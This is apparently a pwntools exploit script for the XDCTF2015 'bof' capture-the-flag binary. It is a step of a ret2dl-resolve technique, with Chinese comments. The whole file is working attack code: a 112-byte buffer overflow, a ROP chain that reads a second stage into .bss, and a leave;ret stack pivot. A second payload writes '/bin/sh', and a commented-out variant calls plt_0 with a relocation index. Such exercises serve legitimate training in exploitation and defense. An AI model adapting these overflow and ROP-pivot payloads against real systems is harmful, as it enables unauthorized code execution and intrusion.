#-*- coding:utf-8 -*-
from pwn import *
elf = ELF('bof')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x080492d1 # ROPgadget --binary bof --only "pop|ret"
'''
0x080492d1 : pop esi ; pop edi ; pop ebp ; ret
0x080492d3 : pop ebp ; ret
0x08049105 : leave ; ret
'''
pop_ebp_ret = 0x080492d3
leave_ret = 0x08049105 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804c028 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt) # 读100个字节到base_stage
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
payload += p32(base_stage)
payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
r.sendline(payload)

cmd = "/bin/sh"

payload2 = 'AAAA' # 接上一个payload的leave->pop ebp ; ret
payload2 += p32(write_plt)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
'''
cmd = "/bin/sh"
plt_0 = 0x08049020 # objdump -d -j .plt bof
index_offset = 0x20 # write's index

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
'''